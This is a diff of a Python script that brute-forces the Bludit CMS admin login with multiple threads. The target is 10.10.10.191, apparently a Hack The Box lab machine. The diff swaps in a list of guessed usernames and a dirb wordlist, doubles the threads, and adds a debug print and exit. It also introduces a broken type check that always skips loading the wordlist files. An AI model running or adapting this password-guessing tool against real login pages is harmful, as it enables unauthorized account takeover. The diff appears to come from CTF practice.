@@ -13,23 +13,25 @@ import threading
 
 server = "10.10.10.191"
 port = 80
-path = "/admin/login"  # Path of the bludit login
-check = False  # set true to check bludit version
-# user and pass can be a simple word or a path to a dictionary
+path = "/admin"  # Path of the bludit login
+# user and pass can be a simple word, a list or a path to a dictionary
 # warning: using large files can freeze your box. Experience talking
-userwordlist = "admin"
-passwordlist = "wordlist.txt"
-threads = 20  # Elevated use of threads may need a greather timeout
+userwordlist = ["admin","test","guest","info","user","EgotisticalSW","hackthebox"]
+passwordlist = "/usr/share/wordlists/dirb/big.txt"
+threads = 40  # Elevated use of threads may need a greather timeout
 timeout = 30
 errmsg = "Username or password incorrect"  # error message in case of incorrect login attempt
+
 
 
 credentials = ""  # leave this variable empty
 
 wordlistpair = [userwordlist, passwordlist]
 for i in range(2):
+    if type(wordlistpair[i] == list):
+        continue
     if os.path.isfile(wordlistpair[i]):
-        wordlistpair[i] = open(wordlistpair[i], 'r').read()
+        wordlistpair[i] = open(wordlistpair[i], 'r', encoding="latin-1").read()
     userwordlist = wordlistpair[0].split("\n")
     passwordlist = wordlistpair[1].split("\n")
 del wordlistpair
@@ -88,7 +90,7 @@ def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/lo
             "Connection":"close",
             "Cookie":cookie,
         }
-        print("[*] Threads [%03d], Trying: %20s:%-20s"%(threading.active_count(),username,password),end="\r")
+        print("[*] Threads [%03d], Trying: %20s:%-40s"%(threading.active_count(),username,password),end="\r")
         try:
             token = POST_request(HTTPHandler,header,bodydata,path)
         except:
@@ -114,7 +116,10 @@ for i in itertools.count(width,width):  # dividing pass wordlist per threads
     aux2 = i
     if aux3 == 1:
         break
-del aux1,aux2,aux3,width    
+del aux1,aux2,aux3,width
+
+print(userwordlist)
+exit()
 
 for user in userwordlist:
     for pswr in pswdict.keys():
